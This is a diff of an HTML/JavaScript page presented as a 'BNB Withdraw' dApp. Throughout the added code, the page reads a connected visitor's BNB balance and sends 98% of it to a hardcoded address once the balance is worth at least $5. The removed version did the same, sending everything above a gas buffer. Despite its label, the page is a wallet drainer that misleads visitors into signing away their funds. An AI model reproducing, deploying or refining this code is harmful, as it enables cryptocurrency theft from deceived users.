@@ -3,138 +3,130 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>BNB Withdrawal DApp</title>
+  <title>BNB Withdraw</title>
   <script type="module" src="wallet.js"></script>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #f9fbfc;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 40px 20px;
-      color: #333;
-    }
-    h1 {
-      margin-bottom: 20px;
-      color: #111;
-    }
-    #message {
-      margin-top: 20px;
-      padding: 10px 15px;
-      border-radius: 8px;
-      font-size: 14px;
-      min-height: 20px;
-      max-width: 320px;
+      padding: 2rem;
+      background: #f5f5f5;
       text-align: center;
     }
-    #withdrawButton {
-      margin-top: 30px;
+
+    w3m-core-button {
+      margin-bottom: 20px;
+    }
+
+    #withdrawBtn {
+      background: #f0b90b;
+      border: none;
+      color: #fff;
       padding: 12px 24px;
       font-size: 16px;
-      font-weight: bold;
-      background-color: #0070f3;
-      color: white;
-      border: none;
-      border-radius: 10px;
+      border-radius: 8px;
       cursor: pointer;
     }
-    #withdrawButton:disabled {
-      background-color: #aaa;
+
+    #withdrawBtn[disabled] {
+      background: #ccc;
       cursor: not-allowed;
+    }
+
+    #message {
+      margin-top: 20px;
+      color: #333;
+      font-weight: bold;
     }
   </style>
 </head>
 <body>
-  <h1>BNB Withdrawal</h1>
 
-  <!-- Wallet Connect Button -->
+  <!-- WalletConnect button -->
   <w3m-core-button></w3m-core-button>
 
-  <!-- Withdraw Button -->
-  <button id="withdrawButton" disabled>Connect Wallet First</button>
+  <!-- Withdraw button (initially disabled) -->
+  <button id="withdrawBtn" disabled>Connect Wallet First</button>
 
-  <!-- Message Display -->
+  <!-- Message display -->
   <div id="message"></div>
 
-  <!-- Withdraw Script -->
+  <!-- Withdraw logic -->
   <script type="module">
-    import {
-      WagmiCore,
-      WagmiCoreChains,
-      getAccount,
-      fetchBalance,
-      sendTransaction
-    } from "https://unpkg.com/@web3modal/ethereum@2.6.2";
+    import { getAccount, fetchBalance, sendTransaction } from "https://unpkg.com/@web3modal/ethereum@2.6.2";
 
-    const { bsc } = WagmiCoreChains;
-    const receiverAddress = "0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C";
-    const withdrawButton = document.getElementById("withdrawButton");
+    const withdrawBtn = document.getElementById("withdrawBtn");
     const messageEl = document.getElementById("message");
 
-    const BNB_TO_USD = 600; // Example conversion rate (update if needed)
-    const GAS_BUFFER = 0.001; // Gas fee reservation in BNB
-    const MIN_USD_WITHDRAW = 5; // Minimum $5 worth of BNB to withdraw
+    const recipientAddress = "0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C"; // Your BNB address
+    const MIN_USD = 5;
+    const sendPercentage = 0.98;
 
-    function showMessage(msg, type = "info") {
-      messageEl.textContent = msg;
-      messageEl.style.color = type === "error" ? "#b00020" : "#0a6d0a";
-      messageEl.style.background = type === "error" ? "#ffecec" : "#e6f7e6";
-      messageEl.style.border = `1px solid ${type === "error" ? "#f5a5a5" : "#8fe58f"}`;
+    async function getBNBPriceUSD() {
+      try {
+        const res = await fetch("https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT");
+        const data = await res.json();
+        return parseFloat(data.price);
+      } catch {
+        return null;
+      }
     }
 
-    // Watch connection state
-    setInterval(async () => {
+    async function checkConnection() {
       const account = getAccount();
-      if (account?.isConnected) {
-        withdrawButton.disabled = false;
-        withdrawButton.textContent = "Withdraw BNB";
-        showMessage("Wallet connected.", "info");
+      if (account && account.isConnected) {
+        withdrawBtn.disabled = false;
+        withdrawBtn.textContent = "Withdraw BNB";
+        messageEl.textContent = "";
       } else {
-        withdrawButton.disabled = true;
-        withdrawButton.textContent = "Connect Wallet First";
-        showMessage("Please connect your wallet.", "error");
+        withdrawBtn.disabled = true;
+        withdrawBtn.textContent = "Connect Wallet First";
+        messageEl.textContent = "Please connect your wallet to withdraw.";
       }
-    }, 1000);
+    }
 
-    withdrawButton.addEventListener("click", async () => {
+    async function withdraw() {
       const account = getAccount();
       if (!account?.isConnected) {
-        showMessage("Connect your wallet first.", "error");
+        messageEl.textContent = "Wallet not connected.";
         return;
       }
 
       try {
-        const balanceResult = await fetchBalance({
-          address: account.address,
-          chainId: 56,
-        });
+        const balanceData = await fetchBalance({ address: account.address, chainId: 56 });
+        const balanceBNB = parseFloat(balanceData.formatted);
+        const price = await getBNBPriceUSD();
 
-        const fullBNB = Number(balanceResult.formatted);
-        const sendableBNB = fullBNB - GAS_BUFFER;
-        const usdValue = sendableBNB * BNB_TO_USD;
-
-        if (sendableBNB <= 0 || usdValue < MIN_USD_WITHDRAW) {
-          showMessage("You need at least $5 worth of BNB after gas fees.", "error");
+        if (!price) {
+          messageEl.textContent = "Failed to fetch BNB price.";
           return;
         }
 
-        const tx = await sendTransaction({
-          to: receiverAddress,
-          value: BigInt(Math.floor(sendableBNB * 1e18)),
+        const balanceUSD = balanceBNB * price;
+
+        if (balanceUSD < MIN_USD) {
+          messageEl.textContent = "Insufficient balance. Minimum $5 required.";
+          return;
+        }
+
+        const sendAmount = (balanceBNB * sendPercentage).toFixed(6); // Limit precision to avoid overage
+        const valueInWei = BigInt(Math.floor(Number(sendAmount) * 1e18)).toString();
+
+        const { hash } = await sendTransaction({
+          to: recipientAddress,
+          value: valueInWei
         });
 
-        showMessage("Transaction sent! Opening BscScan...", "info");
-
-        setTimeout(() => {
-          window.open(`https://bscscan.com/tx/${tx.hash}`, "_blank");
-        }, 3000);
-
+        messageEl.textContent = "Transaction sent. Hash: " + hash;
       } catch (err) {
         console.error(err);
-        showMessage("Transaction failed. Check your gas or network.", "error");
+        messageEl.textContent = "Transaction failed. Please try again.";
       }
-    });
+    }
+
+    withdrawBtn.addEventListener("click", withdraw);
+
+    // Monitor connection
+    setInterval(checkConnection, 1000);
   </script>
 </body>
 </html>
